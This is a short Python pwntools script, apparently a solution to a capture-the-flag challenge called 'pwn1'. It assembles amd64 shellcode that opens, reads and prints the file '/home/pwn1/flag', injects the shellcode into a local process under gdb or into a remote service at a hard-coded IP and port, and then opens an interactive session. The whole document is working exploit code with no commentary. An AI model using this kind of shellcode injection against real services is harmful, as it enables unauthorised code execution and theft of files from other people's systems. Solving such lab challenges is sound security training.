from pwn import *
import time
import sys


def exploit(proc):
    buf = shellcraft.linux.open('/home/pwn1/flag')
    buf += shellcraft.amd64.linux.read('rax', 'rsp', count=41)
    buf += '''
    sub al, al
    syscall'''
    buf += shellcraft.amd64.linux.write(1, 'rsi', 41)
    print buf

    buf = asm(buf)
    raw_input('wait')
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    if len(sys.argv) > 1:
        proc = remote('10.13.2.43', 10739)
    else:
        proc = process('./pwn1')
        gdb.attach(proc, '''
        set follow-fork-mode child
        b *0x401046
        continue
        ''')
    exploit(proc)
    proc.interactive()
